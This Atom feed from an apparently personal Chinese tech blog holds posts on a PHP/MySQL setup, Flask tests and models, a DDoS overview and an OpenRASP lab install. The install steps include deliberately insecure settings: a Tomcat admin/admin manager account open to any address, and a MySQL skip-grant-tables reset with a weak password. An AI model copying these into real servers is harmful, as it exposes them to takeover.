<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-06-20T11:30:52.845Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>在ubuntu18下配置php开发环境</title>
    <link href="http://yoursite.com/2018/06/20/%E5%9C%A8ubuntu18%E4%B8%8B%E9%85%8D%E7%BD%AEphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    <id>http://yoursite.com/2018/06/20/在ubuntu18下配置php开发环境/</id>
    <published>2018-06-20T11:30:22.000Z</published>
    <updated>2018-06-20T11:30:52.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="更新源"><a class="markdownIt-Anchor" href="#更新源"></a> 更新源</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/source.list</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">sudo apt-get update -y</span><br></pre></td></tr></table></figure><h1 id="安装apache"><a class="markdownIt-Anchor" href="#安装apache"></a> 安装apache</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apache2</span><br><span class="line">service apache2 status</span><br><span class="line">service apache2 restrat</span><br></pre></td></tr></table></figure><h1 id="安装php7"><a class="markdownIt-Anchor" href="#安装php7"></a> 安装php7</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.0</span><br><span class="line">php -v</span><br></pre></td></tr></table></figure><h1 id="安装mysql57"><a class="markdownIt-Anchor" href="#安装mysql57"></a> 安装mysql5.7</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mysql-server </span><br><span class="line"># 更改密码</span><br><span class="line">sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf</span><br><span class="line">---加上</span><br><span class="line">...</span><br><span class="line">skip-grant-tables </span><br><span class="line">...</span><br><span class="line">-----</span><br><span class="line"></span><br><span class="line">sudo service mysql restart </span><br><span class="line"></span><br><span class="line">mysql -u root</span><br><span class="line">use msyql;</span><br><span class="line">UPDATE user set plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update user set authentication_string = password(&apos;qwe123&apos;), password_expired = &apos;N&apos;, password_last_changed = now() where user = &apos;root&apos;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">select user, host, plugin from user where user=&apos;root&apos;;</span><br><span class="line"></span><br><span class="line"># 改回来配置+重启</span><br><span class="line"></span><br><span class="line">mysql -u root -p qwe123</span><br></pre></td></tr></table></figure><h1 id="安装php-admin"><a class="markdownIt-Anchor" href="#安装php-admin"></a> 安装php-admin</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install phpmyadmin php-mbstring php-gettext，安装的过程中选择apache2。</span><br><span class="line"></span><br><span class="line">sudo phpenmod mcrypt</span><br><span class="line">sudo phpenmod mbstring</span><br><span class="line">修改完成之后sudo systemctl restart apache2重启apache2服务器。</span><br></pre></td></tr></table></figure><h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">打开浏览器</span><br><span class="line"></span><br><span class="line">http://localhost/phpmyadmin</span><br></pre></td></tr></table></figure><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://segmentfault.com/a/1190000005786808" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005786808</a></p><p><a href="https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost" target="_blank" rel="noopener">https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;更新源&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#更新源&quot;&gt;&lt;/a&gt; 更新源&lt;/h1&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
      <category term="linux" scheme="http://yoursite.com/categories/linux/"/>
    
      <category term="php" scheme="http://yoursite.com/categories/linux/php/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Flask08 - unittest</title>
    <link href="http://yoursite.com/2018/06/19/Flask08-unittest/"/>
    <id>http://yoursite.com/2018/06/19/Flask08-unittest/</id>
    <published>2018-06-18T16:08:54.000Z</published>
    <updated>2018-06-18T16:19:48.740Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>不可缺少的单元测试！ 使用unittest框架测试web应用的功能</p></blockquote><h1 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">from datetime import datetime,timedelta</span><br><span class="line">import unittest</span><br><span class="line">from microblogapp import app,db</span><br><span class="line">from microblogapp.models import User,Post</span><br><span class="line"></span><br><span class="line">class UserModelClass(unittest.TestCase):</span><br><span class="line">    def setUp(self):</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">    def tearDown(self):</span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line"></span><br><span class="line">    def test_password(self):</span><br><span class="line">        u = User(username=&apos;johnw&apos;)</span><br><span class="line">        hash1 = u.set_password_hash(&apos;cat&apos;)</span><br><span class="line">        self.assertTrue(u.check_password_hash(&apos;cat&apos;))</span><br><span class="line">        self.assertFalse(u.check_password_hash(&apos;dog&apos;))</span><br><span class="line"></span><br><span class="line">    def test_follow(self):</span><br><span class="line">        u1 = User(username=&apos;susan&apos;)</span><br><span class="line">        u2 = User(username=&apos;chris&apos;)</span><br><span class="line"></span><br><span class="line">        db.session.add(u1)</span><br><span class="line">        db.session.add(u2)</span><br><span class="line"></span><br><span class="line">        u1.follow(u2)</span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line">        self.assertTrue(u1.is_following(u2))</span><br><span class="line">        self.assertEqual(u1.followed.count(),1)</span><br><span class="line">        self.assertEqual(u2.followers.count(),1)</span><br><span class="line">        self.assertEqual(u1.followed.first().username,&apos;chris&apos;)</span><br><span class="line">        self.assertEqual(u2.followers.first().username,&apos;susan&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def test_follow_post(self):</span><br><span class="line">        u1 = User(username=&apos;john&apos;)</span><br><span class="line">        u2 = User(username=&apos;susan&apos;)</span><br><span class="line">        u3 = User(username=&apos;jack&apos;)</span><br><span class="line">        u4 = User(username=&apos;chris&apos;)</span><br><span class="line"></span><br><span class="line">        now = datetime.now()</span><br><span class="line">        p1 = Post(body=&apos;Post from john&apos;,author=u1,timestamp=now+timedelta(seconds=1))</span><br><span class="line">        p2 = Post(body=&apos;Post from susan&apos;,author=u2,timestamp=now+timedelta(seconds=4))</span><br><span class="line">        p3 = Post(body=&apos;Post from jack&apos;,author=u3,timestamp=now+timedelta(seconds=2))</span><br><span class="line">        p4 = Post(body=&quot;Post from chris&quot;,author=u4,timestamp=now+timedelta(seconds=3))</span><br><span class="line"></span><br><span class="line">        db.session.add_all([u1,u2,u3,u4])</span><br><span class="line">        db.session.add_all([p1,p2,p3,p4])</span><br><span class="line"></span><br><span class="line">        u1.follow(u2) # john follow susan </span><br><span class="line">        u1.follow(u4) # john follow chris</span><br><span class="line">        u2.follow(u3) # susan follow jack</span><br><span class="line">        u3.follow(u4) # jack follow chris</span><br><span class="line">        </span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line">        f1 = u1.followed_posts().all()</span><br><span class="line">        f2 = u2.followed_posts().all()</span><br><span class="line">        f3 = u3.followed_posts().all()</span><br><span class="line">        f4 = u4.followed_posts().all()</span><br><span class="line"></span><br><span class="line">        self.assertEqual(f1,[p2,p4,p1])</span><br><span class="line">        self.assertEqual(f2,[p2,p3])</span><br><span class="line">        self.assertEqual(f3,[p4,p3])</span><br><span class="line">        self.assertEqual(f4,[p4])</span><br><span class="line"></span><br><span class="line">if &quot;__main__&quot; == __name__:</span><br><span class="line">    unittest.main(verbosity=2)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;不可缺少的单元测试！ 使用unittest框架测试web应用的功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Flask07 - 数据库多对多关系</title>
    <link href="http://yoursite.com/2018/06/19/Flask07-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%9A%E5%AF%B9%E5%A4%9A%E5%85%B3%E7%B3%BB/"/>
    <id>http://yoursite.com/2018/06/19/Flask07-数据库多对多关系/</id>
    <published>2018-06-18T16:08:05.000Z</published>
    <updated>2018-06-18T16:19:55.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>简述如何实现关注与被关注的业务逻辑。涉及到数据库多对多的关系</p></blockquote><h1 id="数据库关系"><a class="markdownIt-Anchor" href="#数据库关系"></a> 数据库关系</h1><ol><li>一对多的关系</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">post</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">一个<span class="title">user</span>可以写多篇的<span class="title">post</span>，但是一个<span class="title">post</span>只能由一个<span class="title">user</span>写出来</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">所以，</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">post</span> 存储 <span class="title">user_id</span></span></span><br><span class="line">user_id = db.Column(db.Integer,db.ForeignKey('user.id'))</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> 存储 <span class="title">relationship</span></span></span><br><span class="line">posts = db.relationship('Post',backref='author',lazy='dynamic')</span><br></pre></td></tr></table></figure><ol start="2"><li>多对多的关系</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">假设有两个表： 老师 - 学生</span><br><span class="line"></span><br><span class="line">一个学生有多个老师</span><br><span class="line">一个老师有多个学生</span><br><span class="line"></span><br><span class="line">需要第三个辅助表：</span><br><span class="line"></span><br><span class="line">student_teacher:</span><br><span class="line">student_id</span><br><span class="line">teacher_id</span><br><span class="line"></span><br><span class="line">对于follower 和 followed 针对的都是 User 这个类</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 首先建立一个辅助表</span><br><span class="line">followers = db.table(</span><br><span class="line">    <span class="comment"># 关注了哪些user</span></span><br><span class="line">    db.Column(<span class="string">'follower_id'</span>,db.Integer,db.ForeignKey(<span class="string">'user.id'</span>)),</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 被哪些user关注</span></span><br><span class="line">    db.Column(<span class="string">'followed_id'</span>,db.Integer,db.ForeignKey(<span class="string">'user.id'</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 开始在模型中建立关系</span><br><span class="line"> <span class="comment"># 关注了哪些偶像</span></span><br><span class="line">followed = db.relationship(<span class="string">'User'</span>,secondary=followers,</span><br><span class="line">    <span class="comment"># 这个人的id，也就是追随者的id</span></span><br><span class="line">    primaryjoin=(followers.c.follower_id == id),</span><br><span class="line">    <span class="comment"># 这个是偶像的id，也是被追随者的id</span></span><br><span class="line">    secondaryjoin=(followers.c.followed_id == id),</span><br><span class="line">    backref=db.backref(<span class="string">'followers'</span>,lazy=<span class="string">'dynamic'</span>),lazy=<span class="string">'dynamic'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 这个时候如何创造模型：</span></span><br><span class="line"><span class="number">1.</span> 把这个<span class="class"><span class="keyword">class</span> <span class="title">user</span>当成一个主动的人。就是这个关系呢，你要去关注别人，那最好的方式就是有几个动词：</span></span><br><span class="line"><span class="class"><span class="title">follow</span> 关注别人</span></span><br><span class="line"><span class="class"><span class="title">unfollow</span> 不关注别人</span></span><br><span class="line"><span class="class"><span class="title">following</span> 是否正在关注别人</span></span><br><span class="line"><span class="class"></span></span><br><span class="line">所以这个followed==》返回的是已经关注的人的列表。偶像的列表</span><br><span class="line"></span><br><span class="line">这个relationship是个动词，这个类是主语。</span><br></pre></td></tr></table></figure><ol start="3"><li>文章用于解释的例子</li></ol><ul><li>user表</li></ul><table><thead><tr><th>user id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>john</td></tr><tr><td>2</td><td>susan</td></tr><tr><td>3</td><td>marry</td></tr><tr><td>4</td><td>davin</td></tr></tbody></table><ul><li>关注</li></ul><table><thead><tr><th>关注的人</th><th>被关注的人</th></tr></thead><tbody><tr><td>1 (john)</td><td>2 (susan)</td></tr><tr><td>1 (john)</td><td>4 (davin)</td></tr><tr><td>2 (susan)</td><td>3 (marry)</td></tr><tr><td>3 (marry)</td><td>4 (davin)</td></tr></tbody></table><ul><li>文章</li></ul><table><thead><tr><th>id(post)</th><th>text</th><th>user_id</th><th>follower_id</th><th>follwed_id</th></tr></thead><tbody><tr><td>1</td><td>text from susan</td><td>2</td><td>1 (john)</td><td>2</td></tr><tr><td>2</td><td>text from marry</td><td>3</td><td>2 (susan)</td><td>3</td></tr><tr><td>3</td><td>text from davin</td><td>4</td><td>1 (john)</td><td>4</td></tr><tr><td>4</td><td>text from davin</td><td>4</td><td>3 (marry)</td><td>4</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">我们可以看到对于这篇文章来说：</span><br><span class="line">follower_id 是追随者的id</span><br><span class="line">follwed_id 是这篇文章被用于追随的id，也就是user id</span><br><span class="line"></span><br><span class="line">所以我们可以使用</span><br><span class="line"></span><br><span class="line">Post.query.filter(followers.c.followed==Post.user_id)来找出那些有被关注的文章，</span><br><span class="line">然后使用 follower_id 来筛选哪些文章要被展示</span><br></pre></td></tr></table></figure><ol start="4"><li>union的使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 在时间线中展示自己的文章</span><br><span class="line"></span><br><span class="line"># 检索文章</span><br><span class="line">def followed_posts(self):</span><br><span class="line">    # 联合查询。首先查出这个文章的作者id是已经关注的，接着查询关注者id是否为本人，最后按时间降序排序</span><br><span class="line">    followed = Post.query.join(followers,(followers.c.followed_id == Post.user_id)).filter(followers.c.follower_id == self.id)</span><br><span class="line">    own = Post.query.filter_by(user_id=self.id)</span><br><span class="line">    return followed.union(own).order_by(Post.timestamp.desc())</span><br></pre></td></tr></table></figure><ol start="5"><li>将功能集成到application中</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 路由</span><br><span class="line">@app.route(&apos;/follow/&lt;username&gt;&apos;)</span><br><span class="line">@login_required</span><br><span class="line">def follow(username):</span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line">    if user is None:</span><br><span class="line">        flash(&apos;User &quot;&#123;&#125;&quot; is not found&apos;.format(username))</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">    if user == current_user:</span><br><span class="line">        flash(&apos;You can follow yourself.&apos;)</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">    current_user.follow(user)</span><br><span class="line">    flash(&apos;You are following &#123;&#125;&apos;.format(username))</span><br><span class="line">    db.session.commit()</span><br><span class="line">    return redirect(url_for(&apos;user&apos;,username=username))</span><br><span class="line"></span><br><span class="line"># templates == user.html</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&#123;&#123; user.follows.count() &#125;&#125; followers, &#123;&#123; user.followed.count() &#125;&#125; following&lt;/p&gt;</span><br><span class="line">&lt;a href=&quot;&#123;&#123;url_for(&apos;follow&apos;,username=user.username)&#125;&#125;&quot;&gt;follow&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;&#123;&#123;url_for(&apos;unfollow&apos;,username=user.username)&#125;&#125;&quot;&gt;unfollow&lt;/a&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;简述如何实现关注与被关注的业务逻辑。涉及到数据库多对多的关系&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;数据
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>4-DDoS了解</title>
    <link href="http://yoursite.com/2018/06/18/4-DDoS%E4%BA%86%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/06/18/4-DDoS了解/</id>
    <published>2018-06-18T12:19:53.000Z</published>
    <updated>2018-06-18T14:41:21.629Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>DDoS攻击分为流量型攻击和CC攻击，<strong>流量攻击</strong>主要是发送报文侵占正常业务的带宽，阻塞整个数据中心的出口，导致正常用户的访问无法到达。<br><strong>CC攻击</strong> 主要针对某些业务频繁访问，激发大量消耗资源的数据库查询，文件IO，导致业务服务器CPU，或者IO出现瓶颈，无法提供正常的服务。</p></blockquote><h1 id="案例"><a class="markdownIt-Anchor" href="#案例"></a> 案例</h1><ol><li>TCP SYN FLOOD</li></ol><blockquote><p>一个正常的TCP需要三次握手，如下所示：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端 --发送TCP SYN数据包--&gt;服务器分配控制块--返回SYN ACK数据包--&gt; 客户端 --返回 SYN ACK数据包--&gt; 服务器端--&gt; 服务器释放控制块</span><br><span class="line"></span><br><span class="line">如果客户端不返回SYN ACK数据包，或者不存在，那么就会造成TCP SYN 泛洪攻击</span><br></pre></td></tr></table></figure><ol start="2"><li>UDP FLOOD攻击</li></ol><blockquote><p>UDP 是没有连接状态的协议，因此可以发送大量的UDP请求，干扰正常应用。</p></blockquote><ol start="3"><li>反射型攻击</li></ol><blockquote><p>黑客伪造IP，向网络上大量开放特定服务的服务器进行请求，从而造成被伪造IP地址的服务器形成了DDoS攻击</p></blockquote><h1 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h1><p>1, 流量清洗<br>2，流量压制</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;DDoS攻击分为流量型攻击和CC攻击，&lt;strong&gt;流量攻击&lt;/strong&gt;主要是发送报文侵占正常业务的带宽，阻塞
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/security/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>5-RASP安装</title>
    <link href="http://yoursite.com/2018/06/18/5-RASP%E5%AE%89%E8%A3%85/"/>
    <id>http://yoursite.com/2018/06/18/5-RASP安装/</id>
    <published>2018-06-18T12:19:39.000Z</published>
    <updated>2018-06-18T14:41:17.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>RASP, 一种已探针的形式，将保护引擎注入到应用服务中，可在文件，数据库，网络等多个方面，对应用进行保护，当发生敏感的行为时，可以结合上下文的请求进行判断，阻断攻击，具有<strong>低误报率，低漏报率</strong>的优点</p></blockquote><h1 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h1><blockquote><p>这里使用的是百度开源的OpenRASP进行实验。下面是实验步骤</p></blockquote><ol><li>安装tomcat服务器</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yum install java -y</span><br><span class="line"></span><br><span class="line">下载tomcat</span><br><span class="line">https://tomcat.apache.org/download-80.cgi</span><br><span class="line"></span><br><span class="line">配置manager页面</span><br><span class="line">vim conf/tomcat-users.xml</span><br><span class="line"></span><br><span class="line">&lt;role rolename=&quot;admin&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-script&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-status&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;admin,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&quot;/&gt;</span><br><span class="line"></span><br><span class="line">添加远程访问</span><br><span class="line">vim conf/Catalina/localhost/manager.xml:</span><br><span class="line"></span><br><span class="line">&lt;Context privileged=&quot;true&quot; antiResourceLocking=&quot;false&quot;</span><br><span class="line">         docBase=&quot;$&#123;catalina.home&#125;/webapps/manager&quot;&gt;</span><br><span class="line">    &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;^.*$&quot; /&gt;</span><br><span class="line">&lt;/Context&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>下载漏洞程序</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 